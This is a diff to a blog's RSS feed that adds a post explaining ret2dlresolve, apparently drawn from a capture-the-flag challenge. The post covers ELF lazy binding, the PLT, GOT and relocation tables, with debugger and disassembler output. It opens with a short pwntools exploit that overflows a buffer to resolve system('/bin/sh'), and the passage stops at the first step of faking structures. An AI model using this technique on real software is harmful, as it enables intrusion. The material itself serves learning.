@@ -6,7 +6,496 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>Just adhere to [CC BY-NC 4.0](https://creativecommons.org/licenses/by-nc/4.0/)</copyright>
-    <lastBuildDate>Sat, 05 Oct 2024 00:09:08 +0530</lastBuildDate><atom:link href="https://ashtrace.github.io/posts/index.xml" rel="self" type="application/rss+xml" /><icon>https://ashtrace.github.io/logo.svg</icon>
+    <lastBuildDate>Tue, 14 Jan 2025 08:57:53 +0530</lastBuildDate><atom:link href="https://ashtrace.github.io/posts/index.xml" rel="self" type="application/rss+xml" /><icon>https://ashtrace.github.io/logo.svg</icon>
+    
+    
+    <item>
+      <title>How are functions resolved: A jump across tables into dl_resolve</title>
+      <link>https://ashtrace.github.io/posts/how_functions_resolve/</link>
+      <pubDate>Tue, 14 Jan 2025 08:57:53 +0530</pubDate>
+      
+      <guid>https://ashtrace.github.io/posts/how_functions_resolve/</guid>
+      <description><![CDATA[<p>While going through another one of those <em>easy</em> challenges (this one dealing with ret2dlresolve), I encountered the following piece of exploit in the writeup which possessed limited verbosity for me and with this level of abstraction I could not figure out what the exploit actually was. Thus I put on my gloves and decided to dig into the dl_resolve process.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./challenge_binary&#39;</span>)
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>process()
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(elf)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># create a resolver for the system function</span>
+</span></span><span style="display:flex;"><span>dlresolve <span style="color:#f92672">=</span> Ret2dlresolvePayload(elf, symbol<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;system&#39;</span>, args<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;/bin/sh&#39;</span>])
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw(<span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">72</span>) <span style="color:#75715e"># padding</span>
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">0</span>, dlresolve<span style="color:#f92672">.</span>data_addr) <span style="color:#75715e"># read in the data and structures for the</span>
+</span></span><span style="display:flex;"><span>ret2dlresolve
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>ret2dlresolve(dlresolve) <span style="color:#75715e"># trigger the linker to resolve system</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(rop<span style="color:#f92672">.</span>chain()) <span style="color:#75715e"># send the exploit</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(dlresolve<span style="color:#f92672">.</span>payload) <span style="color:#75715e"># send the relevant structures</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><blockquote>
+<p>PS: No grudges against the author of the writeup or challenge. I am thankful for them to introduce me to a new topic.</p>
+</blockquote>
+<h2 id="context-information">Context Information</h2>
+<p>We are provided with an ELF binary. I&rsquo;ve tried my best to redact the challenge name.</p>
+<h2 id="binary-executable-security-mitigation-enumeration">Binary Executable Security Mitigation Enumeration</h2>
+<pre tabindex="0"><code>Arch:       amd64-64-little
+RELRO:      Partial RELRO
+Stack:      No canary found
+NX:         NX enabled
+PIE:        No PIE (0x400000)
+RUNPATH:    b&#39;./glibc/&#39;
+Stripped:   No
+</code></pre><h2 id="source-code-analysis">Source code analysis</h2>
+<h3 id="functions">Functions</h3>
+<ul>
+<li>
+<p>main</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">vuln</span>(argc, argv, envp);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></li>
+<li>
+<p>vuln</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">ssize_t</span> <span style="color:#a6e22e">vuln</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">64</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-40h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">0xC8uLL</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li><strong>vuln()</strong> is vulnerable to out-of-bounds write as it tries to read in 200 bytes within a 40 bytes buffer.</li>
+</ul>
+</li>
+</ul>
+<h2 id="exploitation-avenues">Exploitation Avenues</h2>
+<p>As there is not any target <em>win()</em> functions or call to <em>juicy</em> funtions like <em>system()</em>, we need to perform a <code>ret2dlresolve</code> attack to call <em>system()</em> by abusing the dynamic linking process of an ELF.</p>
+<p>During a ret2dlresolve, the attacker tricks the binary into resolving a function of its choice (such as system) into the PLT. This then means the attacker can use the PLT function as if it was originally part of the binary, bypassing ASLR (if present) and <strong>requiring no libc leaks.</strong></p>
+<h2 id="detailed-overview-of-dynamic-linking">Detailed Overview of dynamic linking</h2>
+<p>Dynamically-linked ELF objects import libc functions when they are first called using the PLT and GOT. During the relocation of a runtime symbol, RIP will jump to the PLT and attempt to resolve the symbol. During this process a &ldquo;resolver&rdquo; is called.</p>
+<p>Example: Calling <em>read()</em> in <em>vuln()</em></p>
+<p>At <code>vuln+25</code></p>
+<pre tabindex="0"><code>0x000000000040113b &lt;+25&gt;:    call   0x401030 &lt;read@plt&gt;
+</code></pre><p>At <code>read@plt</code></p>
+<pre tabindex="0"><code>0x401030 &lt;read@plt&gt;: jmp    QWORD PTR [rip+0x2fe2]        # 0x404018 &lt;read@got.plt&gt;
+0x401036 &lt;read@plt+6&gt;:       push   0x0
+0x40103b &lt;read@plt+11&gt;:      jmp    0x401020
+</code></pre><p>First it jumps to <code>read@got.plt</code>, if the function is already linked this location is populated with the address of the target funtion. But on first call it points to the next instruction in the PLT.</p>
+<p>At <code>read@got.plt</code> before first call to read</p>
+<pre tabindex="0"><code>0x404018 &lt;read@got.plt&gt;:        0x0000000000401036
+</code></pre><p>As evident from above, at 0x401036 we push a byte (here 0x0) called <code>reloc_arg</code> (It is essentially the index of the Elf32_Rel/Elf64_Rela in JMPREL table, <em>example: read is at index 0</em>) onto stack and jump to a predefined address (here 0x401020) called <em>default stub</em>. The <code>reloc_arg</code> is multiplied by size of Elf64_Rela (24) to get <code>reloc_offset</code> from the JMPREL base address.</p>
+<p>At the stub, we push <code>link_map</code> ,<em>a list with all the loaded libraries</em>, to the stack and jump to an address loaded from start of the GOT section.</p>
+<pre tabindex="0"><code>0x401020:    push   QWORD PTR [rip+0x2fe2]        # 0x404008
+0x401026:    jmp    QWORD PTR [rip+0x2fe4]        # 0x404010
+</code></pre><p>Here 0x404010 is the start of GOT section. At the start of GOT section there is a special address that lies within the ld.so&rsquo;s memory range responsible for loading the dynamically linked libc function.</p>
+<pre tabindex="0"><code>0x404010:       0x00007ffff7fe8540
+</code></pre><pre tabindex="0"><code>0x7ffff7fd3000     0x7ffff7ff3000    0x20000     0x1000  r-xp   /challenge/glibc/ld-linux-x86-64.so.2
+</code></pre><p>This leads to a function call of the form: <code>_dl_runtime_resolve (link_map , rel_offset/relog_arg)</code>.</p>
+<p><code>_dl_runtime_resolve</code> uses <code>link_map</code> list to resolve the symbol. After relocating the symbol, it populates the approriate entry in SYMTAB, the initial call of read will be invoked following which the control returns to the instruction after the original call instruction to this funtion within the code, for every subsequent call the GOT section has been populated thorugh with the address of the function.</p>
+<pre tabindex="0"><code>0x404018 &lt;read@got.plt&gt;:        0x00007ffff7ee1780
+</code></pre><h2 id="understanding-resolution-sections-and-structures-in-elf">Understanding resolution sections and structures in ELF</h2>
+<p>In order to resolve the functions, there are 3 structures that need to exist within the binary. Faking these 3 structures could enable us to trick the linker into resolving a function of our choice, and we can also pass parameters in (such as <em>/bin/sh</em>) once resolved.</p>
+<pre tabindex="0"><code>readelf -d challenge_binary
+
+Tag        Type                         Name/Value
+
+0x0000000000000005 (STRTAB)             0x400390
+0x0000000000000006 (SYMTAB)             0x400330
+0x0000000000000017 (JMPREL)             0x400430
+</code></pre><p>JMPREL (.rel.plt) has an offset <code>r_offset</code> that stores the target GOT address where to store the resolved address and another index <code>R_SYM</code> into the SYMTAB (.dynsym) a symbol table, the structure at this offset has a member <code>st_name</code> which stores offset into STRTAB (.dynstr), a string table, for symbol name.</p>
+<h3 id="jmprel-relplt">JMPREL (.rel.plt)</h3>
+<p>The JMPREL segment stores <strong>the Relocation Table</strong>, which maps each entry to a symbol.</p>
+<ul>
+<li>
+<p>x86 <em>example</em> ELF:</p>
+<pre tabindex="0"><code>readelf -r source
+
+Relocation section &#39;.rel.dyn&#39; at offset 0x2d0 contains 1 entry:
+Offset     Info    Type            Sym.Value  Sym. Name
+0804bffc  00000206 R_386_GLOB_DAT    00000000   __gmon_start__
+
+Relocation section &#39;.rel.plt&#39; at offset 0x2d8 contains 2 entries:
+Offset     Info    Type            Sym.Value  Sym. Name
+0804c00c  00000107 R_386_JUMP_SLOT   00000000   gets@GLIBC_2.0
+0804c010  00000307 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
+</code></pre></li>
+<li>
+<p>amd64 <em>challenge_binary</em> ELF:</p>
+<pre tabindex="0"><code>readelf -r challenge_binary
+
+Relocation section &#39;.rela.dyn&#39; at offset 0x400 contains 2 entries:
+Offset          Info           Type           Sym. Value    Sym. Name + Addend
+0000004031f0  000200000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0
+0000004031f8  000300000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0
+
+Relocation section &#39;.rela.plt&#39; at offset 0x430 contains 1 entry:
+Offset          Info           Type           Sym. Value    Sym. Name + Addend
+000000404018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0
+</code></pre><ul>
+<li>IDA listing
+<pre tabindex="0"><code>LOAD:0000000000400400                               ; ELF RELA Relocation Table
+LOAD:0000000000400400 F0 31 40 00 00 00 00 00 06 00+Elf64_Rela &lt;4031F0h, 200000006h, 0&gt;     ; R_X86_64_GLOB_DAT __libc_start_main
+LOAD:0000000000400418 F8 31 40 00 00 00 00 00 06 00+Elf64_Rela &lt;4031F8h, 300000006h, 0&gt;     ; R_X86_64_GLOB_DAT __gmon_start__
+LOAD:0000000000400430                               ; ELF JMPREL Relocation Table
+LOAD:0000000000400430 18 40 40 00 00 00 00 00 07 00+Elf64_Rela &lt;404018h, 100000007h, 0&gt;     ; R_X86_64_JUMP_SLOT read
+LOAD:0000000000400430 00 00 01 00 00 00 00 00 00 00+LOAD ends
+</code></pre></li>
+</ul>
+</li>
+</ul>
+<p>These entries are of type <code>Elf32_Rel</code> (in x86 executable) and <code>Elf64_Rela</code> (in amd64 executable):</p>
+<ul>
+<li>
+<p>x86</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">uint32_t</span> Elf32_Addr;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">uint32_t</span> Elf32_Word;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>Elf32_Addr    r_offset;               <span style="color:#75715e">/* Address */</span>
+</span></span><span style="display:flex;"><span>Elf32_Word    r_info;                 <span style="color:#75715e">/* Relocation type and symbol index */</span>
+</span></span><span style="display:flex;"><span>} Elf32_Rel;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* How to extract and insert information held in the r_info field.  */</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define ELF32_R_SYM(val)                ((val) &gt;&gt; 8)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ELF32_R_TYPE(val)               ((val) &amp; 0xff)
+</span></span></span></code></pre></div><p>The column <strong>name</strong> coresponds to our symbol name. The <strong>offset</strong> is the GOT entry for our symbol. <strong>info</strong> stores additional metadata. <strong>ELF32_R_SYM</strong> stores the index of the <code>Elf32_Sym</code>(<em>see SYMTAB section definition below</em>) entry in <code>SYMTAB</code> (Symbol Table) for the specified symbol.</p>
+<p>Due to value of <strong>info</strong> (visible in .rel.plt dump) the <code>R_SYM</code> of <strong>gets</strong> is 1 as 0x107 &raquo; 8 = 1.</p>
+</li>
+<li>
+<p>amd64 (cleaner definition further below)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">using</span> Elf64_Addr <span style="color:#f92672">=</span> <span style="color:#66d9ef">uint64_t</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> Elf64_Xword <span style="color:#f92672">=</span> <span style="color:#66d9ef">uint64_t</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Elf64_Rela</span> {
+</span></span><span style="display:flex;"><span>Elf64_Addr r_offset; <span style="color:#75715e">// Location (file byte offset, or program virtual addr).
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>Elf64_Xword r_info;  <span style="color:#75715e">// Symbol table index and type of relocation to apply.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// These accessors and mutators correspond to the ELF64_R_SYM, ELF64_R_TYPE,
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// and ELF64_R_INFO macros defined in the ELF specification:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>Elf64_Word <span style="color:#a6e22e">getSymbol</span>() <span style="color:#66d9ef">const</span> { <span style="color:#66d9ef">return</span> (r_info <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>); }
+</span></span><span style="display:flex;"><span>Elf64_Word <span style="color:#a6e22e">getType</span>() <span style="color:#66d9ef">const</span> { <span style="color:#66d9ef">return</span> (Elf64_Word)(r_info <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffffL</span>); }
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setSymbol</span>(Elf64_Word s) { setSymbolAndType(s, getType()); }
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setType</span>(Elf64_Word t) { setSymbolAndType(getSymbol(), t); }
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setSymbolAndType</span>(Elf64_Word s, Elf64_Word t) {
+</span></span><span style="display:flex;"><span>    r_info <span style="color:#f92672">=</span> ((Elf64_Xword)s <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">32</span>) <span style="color:#f92672">+</span> (t <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffffL</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>The <code>R_SYM</code> value of read (in <em>challenge_binary</em> ELF) would be 1 (0x000100000007 &raquo; 32).</p>
+<p>The type <code>R_386_JUMP_SLOT</code> and <code>R_X86_64_JUMP_SLOT</code> means that the entry is for GOT section.</p>
+<p>Eg: IDA&rsquo;s listing of JUMPREL of <em>example</em> amd64 ELF.</p>
+<pre tabindex="0"><code>LOAD:04005C0 ; ELF JMPREL Relocation Table
+LOAD:04005C0 Elf64_Rela &lt;404018h, 200000007h, 0&gt; ; R_X86_64_JUMP_SLOT write
+LOAD:04005D8 Elf64_Rela &lt;404020h, 300000007h, 0&gt; ; R_X86_64_JUMP_SLOT strlen
+LOAD:04005F0 Elf64_Rela &lt;404028h, 400000007h, 0&gt; ; R_X86_64_JUMP_SLOT setbuf
+LOAD:0400608 Elf64_Rela &lt;404030h, 500000007h, 0&gt; ; R_X86_64_JUMP_SLOT read
+</code></pre><p>Here the first value is <code>r_offset</code> (offset into GOT), the second value is <code>r_info</code>, the third value is <code>r_addend</code> (available in another definition of <code>Elf64_Rela</code> mentioned further below).</p>
+<p>Notice how the second value mentions the offset within the SYMTAB table with the highest-order-byte - 2, 3, 4, 5 while the lowest-order-byte represents type 7 ie. R_X86_64_JUMP_SLOT.</p>
+<ul>
+<li>Cleaner definition of <code>Elf64_Rela</code>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>Elf64_Addr        r_offset;    <span style="color:#75715e">/* 64 bit - Address */</span>
+</span></span><span style="display:flex;"><span>Elf64_Xword       r_info;      <span style="color:#75715e">/* 64 bit - Relocation type and symbol index */</span>
+</span></span><span style="display:flex;"><span>Elf64_Sxword      r_addend;    <span style="color:#75715e">/* 64 bit - Addend */</span>
+</span></span><span style="display:flex;"><span>} Elf64_Rela; <span style="color:#75715e">// 24 bytes
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">/* How to extract and insert information held in the r_info field.*/</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define ELF64_R_SYM(i)         ((i) &gt;&gt; 32)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ELF64_R_TYPE(i)        ((i) &amp; 0xffffffff)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ELF64_R_INFO(sym,type) ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))
+</span></span></span></code></pre></div></li>
+</ul>
+</li>
+</ul>
+<h3 id="strtab-dynstr">STRTAB (.dynstr)</h3>
+<p>STRTAB is a simple table that stores the strings for symbols name.</p>
+<p>IDA&rsquo;s listing for STRTAB for <em>challenge_binary</em></p>
+<pre tabindex="0"><code>LOAD:0000000000400390                               ; ELF String Table
+LOAD:0000000000400390 00                            unk_400390 db    0                      ; DATA XREF: LOAD:0000000000400348↑o
+LOAD:0000000000400390                                                                       ; LOAD:0000000000400360↑o
+LOAD:0000000000400390                                                                       ; LOAD:0000000000400378↑o
+LOAD:0000000000400390                                                                       ; LOAD:00000000004003E0↓o
+LOAD:0000000000400390                                                                       ; LOAD:00000000004003F0↓o
+LOAD:0000000000400391 72 65 61 64 00                aRead db &#39;read&#39;,0                       ; DATA XREF: LOAD:0000000000400348↑o
+LOAD:0000000000400396 5F 5F 6C 69 62 63 5F 73 74 61+aLibcStartMain db &#39;__libc_start_main&#39;,0 ; DATA XREF: LOAD:0000000000400360↑o
+LOAD:00000000004003A8 6C 69 62 63 2E 73 6F 2E 36 00 aLibcSo6 db &#39;libc.so.6&#39;,0               ; DATA XREF: LOAD:00000000004003E0↓o
+LOAD:00000000004003B2 47 4C 49 42 43 5F 32 2E 32 2E+aGlibc225 db &#39;GLIBC_2.2.5&#39;,0            ; DATA XREF: LOAD:00000000004003F0↓o
+LOAD:00000000004003BE 2E 2F 67 6C 69 62 63 2F 00    aGlibc db &#39;./glibc/&#39;,0
+LOAD:00000000004003C7 5F 5F 67 6D 6F 6E 5F 73 74 61+aGmonStart db &#39;__gmon_start__&#39;,0        ; DATA XREF: LOAD:0000000000400378↑o
+</code></pre><h2 id="symtab-dynsym">SYMTAB (.dynsym)</h2>
+<p>This table holds relevant symbol information.</p>
+<ul>
+<li>
+<p>x86
+Each entry is a <code>Elf32_Sym</code> structure and its size is 16 bytes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> { 
+</span></span><span style="display:flex;"><span>    Elf32_Word st_name ; <span style="color:#75715e">/* Symbol name (string tbl index) -4b*/</span>
+</span></span><span style="display:flex;"><span>    Elf32_Addr st_value ; <span style="color:#75715e">/* Symbol value -4b*/</span> 
+</span></span><span style="display:flex;"><span>    Elf32_Word st_size ; <span style="color:#75715e">/* Symbol size -4b*/</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> st_info ; <span style="color:#75715e">/* Symbol type and binding-1b */</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> st_other ; <span style="color:#75715e">/* Symbol visibility under glibc&gt;=2.2 -1b */</span> 
+</span></span><span style="display:flex;"><span>    Elf32_Section st_shndx ; <span style="color:#75715e">/* Section index -2b*/</span> 
+</span></span><span style="display:flex;"><span>} Elf32_Sym;
+</span></span></code></pre></div></li>
+<li>
+<p>amd64
+Contains a symbol table using <code>Elf64_Sym</code> structures. Every structure associates a symbolic name with a piece of code elsewhere in the binary.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    Elf64_Word     st_name;    <span style="color:#75715e">/* 32bit - Symbol name (string tbl index) */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>  st_info;    <span style="color:#75715e">/* Symbol type and binding */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>  st_other;   <span style="color:#75715e">/* Symbol visibility */</span>
+</span></span><span style="display:flex;"><span>    Elf64_Section  st_shndx;   <span style="color:#75715e">/* 16 bits - Section index */</span>
+</span></span><span style="display:flex;"><span>    Elf64_Addr     st_value;   <span style="color:#75715e">/* 64 bits - Symbol value */</span>
+</span></span><span style="display:flex;"><span>    Elf64_Xword    st_size;    <span style="color:#75715e">/* 64 bits - Symbol size */</span>
+</span></span><span style="display:flex;"><span>} Elf64_Sym; <span style="color:#75715e">// 24 bytes
+</span></span></span></code></pre></div></li>
+<li>
+<p>st_name: It acts as a string table index. It will be used to locate the right string in the STRTAB section.</p>
+</li>
+<li>
+<p>st_info: symbol’s type and binding attributes.</p>
+</li>
+<li>
+<p>st_other: symbol’s visibility.</p>
+</li>
+<li>
+<p>st_shndx: the relevant section header table index.</p>
+</li>
+<li>
+<p>st_value: the value of the associated symbol.</p>
+</li>
+<li>
+<p>st_size: the symbol’s size. If the symbol has no size or the size is unknown, it contains 0.</p>
+</li>
+<li>
+<p>IDA listing <em>challenge_binary</em></p>
+<pre tabindex="0"><code>LOAD:0000000000400330                               ; ELF Symbol Table
+LOAD:0000000000400330 00 00 00 00 00 00 00 00 00 00+Elf64_Sym &lt;0&gt;
+LOAD:0000000000400348 01 00 00 00 12 00 00 00 00 00+Elf64_Sym &lt;offset aRead - offset unk_400390, 12h, 0, 0, 0, 0&gt; ; &#34;read&#34;
+LOAD:0000000000400360 06 00 00 00 12 00 00 00 00 00+Elf64_Sym &lt;offset aLibcStartMain - offset unk_400390, 12h, 0, 0, 0, 0&gt; ; &#34;__libc_start_main&#34;
+LOAD:0000000000400378 37 00 00 00 20 00 00 00 00 00+Elf64_Sym &lt;offset aGmonStart - offset unk_400390, 20h, 0, 0, 0, 0&gt; ; &#34;__gmon_start__
+</code></pre></li>
+<li>
+<p>IDA listing <em>example</em> binary</p>
+<pre tabindex="0"><code>LOAD:04003D8 ; ELF Symbol Table
+LOAD:04003D8 Elf64_Sym &lt;0&gt;
+LOAD:04003F0 Elf64_Sym &lt;offset aLibcStartMain - offset unk_4004B0, 12h, 0, 0, 0, 0&gt; ; &#34;__libc_start_main&#34;
+LOAD:0400408 Elf64_Sym &lt;offset aWrite - offset unk_4004B0, 12h, 0, 0, 0, 0&gt; ; &#34;write&#34;
+LOAD:0400420 Elf64_Sym &lt;offset aStrlen - offset unk_4004B0, 12h, 0, 0, 0, 0&gt; ; &#34;strlen&#34;
+LOAD:0400438 Elf64_Sym &lt;offset aSetbuf - offset unk_4004B0, 12h, 0, 0, 0, 0&gt; ; &#34;setbuf&#34;
+LOAD:0400450 Elf64_Sym &lt;offset aRead - offset unk_4004B0, 12h, 0, 0, 0, 0&gt; ; &#34;read&#34;
+</code></pre></li>
+</ul>
+<blockquote>
+<p>The most important value here is <strong>st_name</strong> as this <strong>gives the offset in STRTAB of the symbol name.</strong> The other fields are not relevant to the exploit itself.</p>
+</blockquote>
+<h3 id="jmprel-symtab-and-strtab-for-challenge_binary-elf">JMPREL, SYMTAB AND STRTAB for challenge_binary ELF</h3>
+<ul>
+<li>
+<p>Base section addresses</p>
+<pre tabindex="0"><code>readelf -d challenge_binary
+
+Tag        Type                         Name/Value
+
+0x0000000000000005 (STRTAB)             0x400390
+0x0000000000000006 (SYMTAB)             0x400330
+0x0000000000000017 (JMPREL)             0x400430
+</code></pre></li>
+<li>
+<p>JMPREL entry for read</p>
+<pre tabindex="0"><code>(gdb) x/2gx 0x0000000000400430 + 0
+0x400430:       0x0000000000404018      0x0000000100000007
+                |__ r_offset            |___ r_info
+</code></pre><p>R_SYM = (r_info &raquo; 32) = 1</p>
+</li>
+<li>
+<p>SYMTAB at index 1</p>
+<pre tabindex="0"><code>x/6wx 0x400330 + 1 * 24
+0x400348:       0x00000001      0x00000012      0x00000000      0x00000000
+0x400358:       0x00000000      0x00000000
+</code></pre><ul>
+<li>SYMTAB base + index * size of Elf64_Sym</li>
+<li>st_name = 1</li>
+</ul>
+</li>
+<li>
+<p>STRTAB at index 1</p>
+<pre tabindex="0"><code>x/s 0x0000000000400390 + 0x00000001
+0x400391:       &#34;read&#34;
+</code></pre></li>
+</ul>
+<h2 id="tldr-function-resolution-pseudocode">TL;DR function resolution pseudocode</h2>
+<p>Exmaple: calling <em>read</em> in x86 ELF</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">_dl_runtime_resolve</span>(link_map, reloc_arg) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uintptr_t</span> reloc_offset <span style="color:#f92672">=</span> reloc_arg <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(Elf64_Rela); <span style="color:#75715e">// reloc_arg is pushed in .plt section
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    Elf64_Rela <span style="color:#f92672">*</span> rel_entry <span style="color:#f92672">=</span> JMPREL <span style="color:#f92672">+</span> reloc_offset ;
+</span></span><span style="display:flex;"><span>    Elf64_Sym <span style="color:#f92672">*</span> sym_entry <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>SYMTAB[<span style="color:#a6e22e">ELF64_R_SYM</span>(rel_entry<span style="color:#f92672">-&gt;</span>r_info)];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> sym_name <span style="color:#f92672">=</span> STRTAB <span style="color:#f92672">+</span> sym_entry<span style="color:#f92672">-&gt;</span>st_name ;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_search_for_symbol_</span>(link_map, sym_name);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// invoke initial read call now that symbol is resolved
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">0x100</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="ret2dlresolve">ret2dlresolve</h2>
+<blockquote>
+<p>Use .bss section to create fake entries, it is closer to the ELF in memory compared to the stack.</p>
+</blockquote>
+<h3 id="step-1">Step 1</h3>
+<p>We need to fake an Elf64_Rela structure and an ELf64_Sym structure with following characteristics</p>
